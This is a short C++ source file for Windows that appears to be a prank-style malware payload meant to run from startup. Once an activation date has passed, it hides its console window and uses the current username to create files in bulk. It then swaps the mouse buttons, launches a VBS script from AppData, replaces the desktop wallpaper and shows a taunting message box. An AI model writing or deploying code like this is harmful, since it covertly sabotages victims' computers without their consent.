// a main file to be movied to startup
#define _WIN32_WINNT 0x0500
#include <fstream>
#include <Windows.h>
#include <Lmcons.h>
#include <string>

#include "date.h"
#include "createFiles.hpp"

int main()
{
	
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (isPassedActivationDate())
	{
		// image as bmp format (dropped at C:\Windows\System32\picture.bmp)
		/// always provide a full path to image
		//SystemParametersInfo( SPI_SETDESKWALLPAPER, 0, (PVOID)"C:\\Windows\\System32\\alkjsdfi.bmp", SPIF_UPDATEINIFILE );
		TCHAR username [UNLEN + 1];
		DWORD size = UNLEN + 1;
		GetUserName((TCHAR*)username, &size);
		createFiles(username, 750);
		
		SwapMouseButton(true);
		
		std::string pictureDirectory = "C:\\Users\\";
		pictureDirectory += username;
		pictureDirectory += "\\AppData\\Local\\picture.bmp";
		
		std::string ttsDirectory = "C:\\Users\\";
		ttsDirectory += username;
		ttsDirectory += "\\AppData\\Local\\Win32Man.vbs";
		
		ShellExecute(NULL, "open", ttsDirectory.c_str(), NULL, NULL, 1);
		SystemParametersInfo( SPI_SETDESKWALLPAPER, 0, (PVOID)pictureDirectory.c_str(), SPIF_UPDATEINIFILE );
	
		MessageBox(NULL, "COOOOOOOON!!!", "Oops (;", NULL);
	}
	
	else {
		// nothing yet
		return 0;
	}
	
	return 0;
}